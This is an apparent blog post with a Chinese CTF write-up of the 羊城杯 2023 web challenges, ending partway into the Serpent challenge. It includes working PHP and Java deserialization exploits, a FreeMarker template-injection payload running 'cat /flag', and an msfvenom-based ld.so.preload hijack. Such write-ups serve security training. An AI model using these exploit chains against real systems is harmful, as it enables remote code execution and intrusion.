<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>羊城杯 2023 Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="羊城杯 2023 Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-09-05T03:25:34.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>September</span>
            <span>5,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">羊城杯 2023 Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当了一回小丑，努力的运维，想进个线下，结果线下不报销，然后给学院背刺了，一开始让我们打以为挺重视的，结果打进线下后来了一句：”最近学院资金不足，只有国家级才可以报销”。。当时人都懵逼了，哎麻了麻了就这样吧。。。。。图一乐<br><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/32634994/1693884287648-87579540-f436-418a-8334-1163919de6d0.jpeg#averageHue=%23595b53&clientId=u7ee1587d-0276-4&from=paste&height=206&id=uc1c3acdd&originHeight=258&originWidth=258&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10335&status=done&style=none&taskId=u7cf12a99-3cd5-4b71-bbe9-dcf8832a233&title=&width=206.4" alt="2bdae59b00b5f749063e7777b6abe1be.jpg"></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="D0n’t-pl4y-g4m3"><a href="#D0n’t-pl4y-g4m3" class="headerlink" title="D0n’t pl4y g4m3!!!"></a>D0n’t pl4y g4m3!!!</h2><p>考点：PHP7.4.21源码泄露，反序列化<br>exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302 found&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pro</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$rce2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$rce2</span>=<span class="variable language_">$this</span>-&gt;exp[<span class="variable">$rce2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prohib</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$a=new Bei;</span></span><br><span class="line"><span class="comment">//$a-&gt;rce=&#x27;E:\\1.txt&#x27;;</span></span><br><span class="line"><span class="comment">//$a-&gt;rce1=&#x27;/tmp/catcatf1ag.txt&#x27;;</span></span><br><span class="line"><span class="comment">//$b=new Yang;</span></span><br><span class="line"><span class="comment">//$a-&gt;CTF=$b;</span></span><br><span class="line"><span class="comment">//$b-&gt;finish-&gt;finish=1;</span></span><br><span class="line"><span class="comment">//$c=new Yang;</span></span><br><span class="line"><span class="comment">//$a-&gt;fine=$c;</span></span><br><span class="line"><span class="comment">//$c-&gt;finish1-&gt;name=1;</span></span><br><span class="line"><span class="comment">//$c-&gt;finish-&gt;finish=1;</span></span><br><span class="line"><span class="comment">//$c-&gt;now=[&quot;YCB1&quot;=&gt;&quot;readfile&quot;];</span></span><br><span class="line"><span class="comment">//echo urlencode(serialize($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">prohib</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;O%3A3%3A%22Bei%22%3A4%3A%7Bs%3A3%3A%22rce%22%3Bs%3A19%3A%22%2Ftmp%2Fcatcatf1ag.txt%22%3Bs%3A4%3A%22rce1%22%3Bs%3A19%3A%22%2Ftmp%2Fcatcatf1ag.txt%22%3Bs%3A3%3A%22CTF%22%3BO%3A4%3A%22Yang%22%3A1%3A%7Bs%3A6%3A%22finish%22%3BO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A6%3A%22finish%22%3Bi%3A1%3B%7D%7Ds%3A4%3A%22fine%22%3BO%3A4%3A%22Yang%22%3A3%3A%7Bs%3A7%3A%22finish1%22%3BO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bi%3A1%3B%7Ds%3A6%3A%22finish%22%3BO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A6%3A%22finish%22%3Bi%3A1%3B%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A8%3A%22readfile%22%3B%7D%7D%7D&#x27;</span>)))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>不是很理解其中cheng和pro类有什么用，完全用不上，直接readfile去读文件就行了。</p>
<h2 id="Ez-java"><a href="#Ez-java" class="headerlink" title="Ez_java"></a>Ez_java</h2><p>考点：java反序列化、freemaker模板注入<br>exp如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ycbjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ycbjava.Utils.HtmlInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> com.ycbjava.Utils.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HtmlMap</span> <span class="variable">htmlMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HtmlMap</span>();</span><br><span class="line">        setFieldValue(htmlMap,<span class="string">&quot;content&quot;</span>,<span class="string">&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;cat /flag\&quot;)&#125;&quot;</span>);</span><br><span class="line">        setFieldValue(htmlMap,<span class="string">&quot;filename&quot;</span>,<span class="string">&quot;index.ftl&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HtmlInvocationHandler</span> <span class="variable">htmlInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HtmlInvocationHandler</span>(htmlMap);</span><br><span class="line">        <span class="comment">//生成动态代理</span></span><br><span class="line">        Map mapproxy= (Map) Proxy.newProxyInstance(HtmlMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,htmlInvocationHandler);</span><br><span class="line">        <span class="comment">//生成最外层</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationconstructor.newInstance(Override.class, mapproxy);</span><br><span class="line">        <span class="comment">//deserTester(o);</span></span><br><span class="line">        System.out.println(base64serial(o));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span>(field != <span class="literal">null</span>) &#123;</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserTester</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        base64deserial(base64serial(o));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">base64deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>CC1后半的动态代理触发htmlinvocationhanddler。然后就是get写文件覆盖index.ftl，payload参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/escape-w/p/17326592.html">https://www.cnblogs.com/escape-w/p/17326592.html</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693651044294-747c4f28-08c0-4691-9b1b-d254e1b937b9.png#averageHue=%23cbcbcb&clientId=u1016775c-414b-4&from=paste&height=1397&id=ue5c45621&originHeight=1397&originWidth=2536&originalType=binary&ratio=1&rotation=0&showTitle=false&size=196148&status=done&style=none&taskId=u66e777cd-1e67-4f45-ba10-0f28cab7843&title=&width=2536" alt="image.png"></p>
<h2 id="Ez-web"><a href="#Ez-web" class="headerlink" title="Ez_web"></a>Ez_web</h2><p>考点：ld.so.preload RCTF2022的trick<br>这一题首先进行一波脑电波的比对，看你知不知道上传的文件是在etc目录下，放出来这个hint就他妈烂了这题。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693651626494-b1c51ccd-b45f-4669-acde-c7531807178f.png#averageHue=%23fefefd&clientId=u1016775c-414b-4&from=paste&height=383&id=u30fc2db4&originHeight=383&originWidth=1203&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10811&status=done&style=none&taskId=u3771e19a-3781-4139-a458-48bd56f25f4&title=&width=1203" alt="image.png"><br>进行一个msfvenom的生成<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693651699559-0469645a-7282-422c-ae96-6bad0c7998a5.png#averageHue=%2330343c&clientId=u1016775c-414b-4&from=paste&height=1101&id=u6cd793c3&originHeight=1101&originWidth=2002&originalType=binary&ratio=1&rotation=0&showTitle=false&size=181773&status=done&style=none&taskId=uc97f1df2-7cdb-41d0-9cfe-85d4008b0a2&title=&width=2002" alt="61b98be19956335f32801e7661abc6b.png"><br>然后捏，把这个文件上传了先<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693651743191-8e69f745-626b-48c2-8d17-b3a0f7c9670c.png#averageHue=%23858a4d&clientId=u1016775c-414b-4&from=paste&height=370&id=u80bd396e&originHeight=370&originWidth=1068&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52120&status=done&style=none&taskId=u8b2de298-fb1f-4d60-b3ca-df074c215da&title=&width=1068" alt="3fb62c366472da0e9965f8be32d1ce2.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693651733926-0e3824dc-8a12-4033-8907-8513dfd5f20e.png#averageHue=%23333332&clientId=u1016775c-414b-4&from=paste&height=422&id=u0c9f139a&originHeight=422&originWidth=934&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57458&status=done&style=none&taskId=u88ac5a39-3a58-4813-97c0-c3ba1ac1610&title=&width=934" alt="e1c837f7bff327861aa207b14223621.png"><br>再跑回cmd执行任意命令，就劫持了LD_PRELOAD<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693651765412-8813c6c0-11bf-4613-9560-65a7a09557d3.png#averageHue=%232f333b&clientId=u1016775c-414b-4&from=paste&height=1101&id=u62c181f4&originHeight=1101&originWidth=2002&originalType=binary&ratio=1&rotation=0&showTitle=false&size=144179&status=done&style=none&taskId=uedbb1590-e2ed-45cd-b8e3-1e7999c00ca&title=&width=2002" alt="2d01b5240ba526746c5ff46b3652480.png"></p>
<h2 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h2><p>考点：jwt伪造、pickle绕过R的反序列化<br>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/verification&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verification</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        attribute = session.get(<span class="string">&#x27;Attribute&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(attribute, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hacker!!!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> attribute.get(<span class="string">&#x27;name&#x27;</span>) == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> attribute.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> secret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Don&#x27;t play tricks on me&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You are a perfect stranger to me&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#GWHTESEeGQMqmz</span></span><br><span class="line"><span class="comment">#&#123;&#x27;Attribute&#x27;: &#123;&#x27;admin&#x27;: 1, &#x27;name&#x27;: &#x27;GWHT&#x27;, &#x27;secret_key&#x27;: &#x27;GWHTESEeGQMqmz&#x27;&#125;&#125;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>还有一段源码，在pickle界面抓包，响应头有hint</p>
